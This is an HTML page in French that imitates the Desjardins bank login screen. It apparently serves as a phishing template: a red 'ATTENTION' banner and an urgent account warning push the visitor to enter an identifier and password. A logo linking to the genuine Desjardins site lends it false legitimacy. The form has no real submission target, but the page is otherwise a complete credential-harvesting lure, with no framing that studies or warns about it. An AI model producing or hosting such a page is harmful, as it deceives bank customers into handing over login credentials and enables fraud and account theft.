<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion Desjardins</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .alert {
      width: 100%;
      background-color: #ff4d4d;
      color: white;
      text-align: center;
      padding: 15px;
      font-weight: bold;
      font-size: 1.2em;
    }

    .container {
      background-color: white;
      margin-top: 30px;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .container h2 {
      color: #333;
      margin-bottom: 20px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input[type="text"],
    input[type="password"] {
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 1em;
    }

    button {
      padding: 12px;
      background-color: #007e3a;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 1em;
      cursor: pointer;
    }

    button:hover {
      background-color: #005e2e;
    }

    .logo {
      margin-top: 40px;
    }

    .logo img {
      width: 100px;
    }
  </style>
</head>
<body>

  <div class="alert">⚠️ ATTENTION</div>

  <div class="container">
    <h2>Votre compte Desjardins requiert votre attention</h2>
    <form action="#" method="post">
      <input type="text" name="identifiant" placeholder="Identifiant" required>
      <input type="password" name="motdepasse" placeholder="Mot de passe" required>
      <button type="submit">Se connecter</button>
    </form>
  </div>

  <div class="logo">
    <a href="https://www.desjardins.com/">
      <img src="DESJARDINS-57872.jpg" alt="Logo Desjardins">
    </a>  
  </div>

</body>
</html>
